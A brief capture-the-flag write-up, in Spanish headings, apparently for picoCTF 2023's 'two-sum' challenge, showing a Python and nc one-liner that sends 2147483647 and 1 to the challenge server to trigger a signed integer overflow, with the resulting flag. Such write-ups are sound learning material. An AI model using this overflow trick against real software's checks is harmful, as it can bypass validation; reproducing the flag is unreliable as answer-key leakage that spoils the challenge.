## Descripcion
Can you solve this? What two positive numbers can make this possible: `n1 > n1 + n2 OR n2 > n1 + n2` Enter them here `nc saturn.picoctf.net 64051`. [Source](https://artifacts.picoctf.net/c/453/flag.c)

## Pistas

## Solucion
[forma 1](obsidian://open?vault=SegRedes&file=picoCTF%202023%2Ftwo-sum)
forma 2
```
jt@jt-VirtualBox:~/Desktop/repos/files/P3/picker$ python3 -c "print(str(2**31 - 1) + ' 1')" | nc saturn.picoctf.net 64051
n1 > n1 + n2 OR n2 > n1 + n2 
What two positive numbers can make this possible: 
You entered 2147483647 and 1
You have an integer overflow
YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_482d8fc4}
```
## bandera
picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_482d8fc4}

## Notas adicionales 

## Referencias